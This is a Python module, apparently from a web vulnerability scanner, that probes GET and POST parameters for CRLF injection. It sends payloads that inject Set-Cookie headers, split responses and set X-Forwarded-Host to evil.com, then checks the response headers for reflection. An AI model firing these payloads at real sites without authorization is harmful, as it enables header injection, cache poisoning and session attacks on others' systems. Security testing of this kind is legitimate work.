import requests
import random
import sys
import os
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from vulnerability_manager import vuln_manager
from parametizer.progress import update_progress, print_vulnerability
from parametizer.core.headers import get_headers
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, ansi, init
from urllib.parse import urlparse, parse_qs
from threading import Lock
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

def is_crlf_vulnerable(response_headers, baseline_headers, payload):
    """
    Función MUY ESTRICTA para detectar vulnerabilidades CRLF reales
    Solo reporta si el payload se refleja exactamente en los headers de respuesta
    """
    # Limpiar el payload para comparación
    clean_payload = payload.replace('%0d%0a', '\r\n').replace('%0a', '\n').replace('%0d', '\r')
    
    # EXIGENCIA 1: El payload debe aparecer EXACTAMENTE en algún header
    for header_name, header_value in response_headers.items():
        # Buscar el payload completo en el valor del header
        if clean_payload in header_value or payload in header_value:
            return True, f"Payload found in header '{header_name}': {header_value}"
    
    # EXIGENCIA 2: Debe haber un header NUEVO que contenga el payload
    baseline_header_names = set(baseline_headers.keys())
    response_header_names = set(response_headers.keys())
    
    new_headers = response_header_names - baseline_header_names
    if new_headers:
        for header_name in new_headers:
            header_value = response_headers[header_name]
            # El header nuevo debe contener el payload
            if clean_payload in header_value or payload in header_value:
                return True, f"New header '{header_name}' contains payload: {header_value}"
    
    # EXIGENCIA 3: Si hay cambios en headers existentes, debe contener el payload
    for header_name in baseline_header_names & response_header_names:
        old_value = baseline_headers[header_name]
        new_value = response_headers[header_name]
        
        if old_value != new_value:
            # El cambio debe contener el payload
            if clean_payload in new_value or payload in new_value:
                return True, f"Modified header '{header_name}' contains payload: {new_value}"
    
    # Si no se cumple ninguna exigencia, NO es vulnerable
    return False, "No payload reflection found in response headers"

def crlf(urip, urif, urls_vulnerables, threads, custom_headers, random_agent):   
    print()
    print('\033[1;36m<<<<<<<<<<<<\033[0m Testing CRLF Injection \033[1;36m>>>>>>>>>>>>>>\033[0m\n')
    print()
    
    crlf_payloads = [
        '%0d%0aSet-Cookie: CRLF=Injected',
        '%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 19%0d%0a%0d%0a<html>CRLF</html>',
        '%0d%0aX-XSS-Protection: 0%0d%0a',
        '%0d%0aX-Forwarded-For: 127.0.0.1%0d%0a',
        '%0d%0aX-Forwarded-Host: evil.com%0d%0a'
    ]

    total_tasks = (len(urip) * len(crlf_payloads) * 2) + (len(urif) * len(crlf_payloads) * 2)
    current = 0
    lock = Lock()
    found_urls = set()
    vulnerable_endpoints = set()
    found = []
    
    # Cache para baselines y endpoints vulnerables
    baseline_cache = {}
    stdout_lock = Lock()

    def test_url(url):
        nonlocal current
        base_url = url.split('?')[0]

        # Filtrar archivos estáticos que raramente son vulnerables a CRLF
        if any(ext in base_url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.woff', '.woff2', '.ttf', '.eot']):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        if vuln_manager.should_skip_url(base_url, base_url_only=True):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        try:
            # Test GET con cache de baseline
            baseline_key = f"GET-{base_url}"
            if baseline_key not in baseline_cache:
                headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
                try:
                    baseline_response = requests.get(url, headers=headers, verify=False, timeout=5)
                    baseline_cache[baseline_key] = baseline_response.headers
                except (requests.exceptions.Timeout, requests.exceptions.RequestException):
                    baseline_cache[baseline_key] = {}
            baseline_headers = baseline_cache[baseline_key]

            for payload in crlf_payloads:
                headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
                test_url = f"{url}{payload}"
                
                try:
                    response = requests.get(test_url, headers=headers, verify=False, timeout=5)
                    
                    # Verificar si hay headers inyectados usando la función mejorada
                    is_vulnerable, reason = is_crlf_vulnerable(response.headers, baseline_headers, payload)
                    if is_vulnerable:
                        with lock:
                            if test_url not in found_urls:
                                found_urls.add(test_url)
                                vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                                
                                # Salida sincronizada
                                with stdout_lock:
                                    print_vulnerability(f"{Fore.GREEN}[GET] [VULNERABLE] {test_url}")
                                    print(f"🚨 {reason}")
                                    
                                    # Mostrar headers inyectados específicos
                                    injected_headers = []
                                    for header_name, header_value in response.headers.items():
                                        if payload in header_value or payload.replace('%0d%0a', '\r\n').replace('%0a', '\n').replace('%0d', '\r') in header_value:
                                            injected_headers.append(f"{header_name}: {header_value}")
                                    
                                    if injected_headers:
                                        print(f"Injected Headers:")
                                        for header in injected_headers:
                                            print(f"  {header}")
                                    else:
                                        # Mostrar qué headers cambiaron para debugging
                                        print(f"New/Modified Headers detected:")
                                        baseline_header_names = set(baseline_headers.keys())
                                        response_header_names = set(response.headers.keys())
                                        
                                        # Headers nuevos
                                        new_headers = response_header_names - baseline_header_names
                                        if new_headers:
                                            print(f"  New headers: {', '.join(new_headers)}")
                                        
                                        # Headers modificados
                                        modified_headers = []
                                        for header_name in baseline_header_names & response_header_names:
                                            if baseline_headers[header_name] != response.headers[header_name]:
                                                modified_headers.append(header_name)
                                        
                                        if modified_headers:
                                            print(f"  Modified headers: {', '.join(modified_headers)}")
                                    
                                    # Mostrar payload completo para debugging
                                    print(f"Payload used: {payload}")
                                    print(f"Full URL length: {len(test_url)} characters")
                                
                                # Guardar la URL completa con el payload que funcionó
                                urls_vulnerables.append(f'{test_url}')
                                
                                # Guardar información detallada para el archivo
                                vulnerability_info = f"""
[GET] [VULNERABLE] {test_url}
New/Modified Headers detected:
  New headers: {', '.join(new_headers) if 'new_headers' in locals() and new_headers else 'None'}
  Modified headers: {', '.join(modified_headers) if 'modified_headers' in locals() and modified_headers else 'None'}
Payload used: {payload}
Full URL length: {len(test_url)} characters
"""
                                urls_vulnerables.append(vulnerability_info)
                                
                                found.append(test_url)
                        break
                except requests.exceptions.Timeout:
                    continue
                except requests.exceptions.RequestException:
                    continue
                
                with lock:
                    current += 1
                    update_progress(current, total_tasks)

            # Test POST solo si hay parámetros
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:  # Solo hacer POST si hay parámetros
                post_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                # Cache de baseline para POST
                baseline_key = f"POST-{base_url}"
                if baseline_key not in baseline_cache:
                    headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
                    data = {k: "TEST123" for k in params}
                    try:
                        baseline_response = requests.post(post_url, headers=headers, data=data, verify=False, timeout=5)
                        baseline_cache[baseline_key] = baseline_response.headers
                    except (requests.exceptions.Timeout, requests.exceptions.RequestException):
                        baseline_cache[baseline_key] = {}
                baseline_headers = baseline_cache[baseline_key]

                for payload in crlf_payloads:
                    headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
                    data = {k: payload for k in params}
                    
                    try:
                        response = requests.post(post_url, headers=headers, data=data, verify=False, timeout=5)
                        
                        # Verificar si hay headers inyectados usando la función mejorada
                        is_vulnerable, reason = is_crlf_vulnerable(response.headers, baseline_headers, payload)
                        if is_vulnerable:
                            with lock:
                                if url not in found_urls:
                                    found_urls.add(url)
                                    vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                                    
                                    # Salida sincronizada
                                    with stdout_lock:
                                        print_vulnerability(f"{Fore.GREEN}[POST] [VULNERABLE] {url}")
                                        print(f"🚨 {reason}")
                                        
                                        # Mostrar headers inyectados específicos
                                        injected_headers = []
                                        for header_name, header_value in response.headers.items():
                                            if payload in header_value or payload.replace('%0a', '\n').replace('%0d', '\r') in header_value:
                                                injected_headers.append(f"{header_name}: {header_value}")
                                        
                                        if injected_headers:
                                            print(f"Injected Headers:")
                                            for header in injected_headers:
                                                print(f"  {header}")
                                        else:
                                            # Mostrar qué headers cambiaron para debugging
                                            print(f"New/Modified Headers detected:")
                                            baseline_header_names = set(baseline_headers.keys())
                                            response_header_names = set(response.headers.keys())
                                            
                                            # Headers nuevos
                                            new_headers = response_header_names - baseline_header_names
                                            if new_headers:
                                                print(f"  New headers: {', '.join(new_headers)}")
                                            
                                            # Headers modificados
                                            modified_headers = []
                                            for header_name in baseline_header_names & response_header_names:
                                                if baseline_headers[header_name] != response.headers[header_name]:
                                                    modified_headers.append(header_name)
                                            
                                            if modified_headers:
                                                print(f"  Modified headers: {', '.join(modified_headers)}")
                                        
                                        # Mostrar payload completo para debugging
                                        print(f"Payload used: {payload}")
                                        print(f"Vulnerable parameters: {', '.join(params.keys())}")
                                        print(f"POST data sent: {data}")
                                    
                                    # Guardar la URL completa con el payload que funcionó
                                    urls_vulnerables.append(f'{url}')
                                    
                                    # Guardar información detallada para el archivo
                                    vulnerability_info = f"""
[POST] [VULNERABLE] {url}
New/Modified Headers detected:
  New headers: {', '.join(new_headers) if 'new_headers' in locals() and new_headers else 'None'}
  Modified headers: {', '.join(modified_headers) if 'modified_headers' in locals() and modified_headers else 'None'}
Payload used: {payload}
Vulnerable parameters: {', '.join(params.keys())}
POST data sent: {data}
"""
                                    urls_vulnerables.append(vulnerability_info)
                                    
                                    found.append(url)
                            break
                    except requests.exceptions.Timeout:
                        continue
                    except requests.exceptions.RequestException:
                        continue
                    
                    with lock:
                        current += 1
                        update_progress(current, total_tasks)

        except Exception as e:
            # Log específico de errores para debugging
            if "timeout" in str(e).lower():
                pass  # Skip timeouts silently
            else:
                pass  # Log other errors if needed
            
            with lock:
                current += 1
                update_progress(current, total_tasks)

    # Crear tareas de manera más eficiente
    tasks = []
    
    # Agrupar tareas por URL para evitar duplicación
    for url in urip + urif:
        tasks.append((test_url, url))
    
    # Procesar TODAS las tareas en paralelo para máximo rendimiento
    with ThreadPoolExecutor(max_workers=threads) as executor:
        # Enviar todas las tareas al pool de hilos
        futures = [executor.submit(task[0], *task[1:]) for task in tasks]
        
        # Esperar a que se completen todas (pero en paralelo)
        for future in futures:
            try:
                future.result()
            except Exception:
                pass
    
    # Limpiar salida final
    with stdout_lock:
        sys.stdout.write('\r' + ansi.clear_line())
        sys.stdout.flush()
    
        print()  # Asegurar salto de línea final
    if found:
        print(f'\n{Fore.CYAN}[+] Found {len(found)} potential CRLF vulnerabilities\n')
    else:
        print('\n\033[1;31m[-] No CRLF vulnerabilities found\033[0m\n')
    
    return urls_vulnerables
